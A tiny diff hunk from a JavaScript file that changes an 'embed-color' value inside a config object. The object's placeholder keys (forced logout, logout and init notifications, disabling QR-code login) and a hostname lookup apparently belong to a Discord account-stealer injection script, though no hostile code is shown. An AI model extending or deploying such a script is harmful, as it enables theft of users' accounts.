@@ -12,7 +12,7 @@ const computerName = os.hostname(),
     logout: "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
     "init-notify": "%INITNOTI%",
-    "embed-color": 3447704,
+    "embed-color": 70000,
     "disable-qr-code": "%DISABLEQRCODE%",
   };
 function FirstTime() {
